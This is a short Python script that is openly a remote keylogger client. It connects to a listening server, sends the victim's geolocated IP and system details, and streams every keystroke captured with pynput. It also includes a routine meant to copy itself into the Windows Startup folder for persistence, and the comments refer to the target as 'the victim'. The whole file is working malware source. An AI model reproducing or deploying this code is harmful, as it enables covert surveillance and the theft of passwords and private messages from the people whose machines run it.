from sys import exit
import socket as s
import geocoder
from os import getcwd, environ, path
from platform import uname, processor, system
from time import sleep
from pynput.keyboard import Listener
from shutil import copyfile


class Client:
    def __init__(self):
        # checking
        self.os = system()
        self.path_file = path.abspath(__file__)

        # True = os is mac | False = os is windows
        self.mod = True
        if self.os == "Darwin":
            self.mod = True
        elif self.os == "Windows":
            self.mod = False
        else:
            exit()

        # Setting impoortant var
        self.client = s.socket()
        self.host = "localhost"
        self.port = 8080
        self.key_logger_mod = True
        self.conn_server()

    # Connect to the server and start basic functions
    def conn_server(self):
        self.client.connect((self.host, self.port))
        print("Connessione effettuata!")
        sleep(2)
        self.get_vinfo()
        self.key_logger()

    # Send message to the server
    def sendmsg(self, msg):
        self.client.send(msg.encode())

    # Get basic info of th ìe victim
    def get_vinfo(self):
        ip = geocoder.ip("me")
        pc_information = f"{getcwd()} {uname()} {processor()}"
        msg = f"ip: {ip} AND info: {pc_information}"
        self.sendmsg(msg)

    # Set the file of auto-startup if the os is windows
    def os_set(self):
        if not self.os:
            path_startup = fr"C:\Users\{environ['USER']}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
            copyfile(self.path_file, path_startup)

    # Listens and sends all keys pressed to the server
    def key_logger(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        if self.key_logger_mod:
            self.sendmsg(str(key))


if __name__ == "__main__":
    Client()
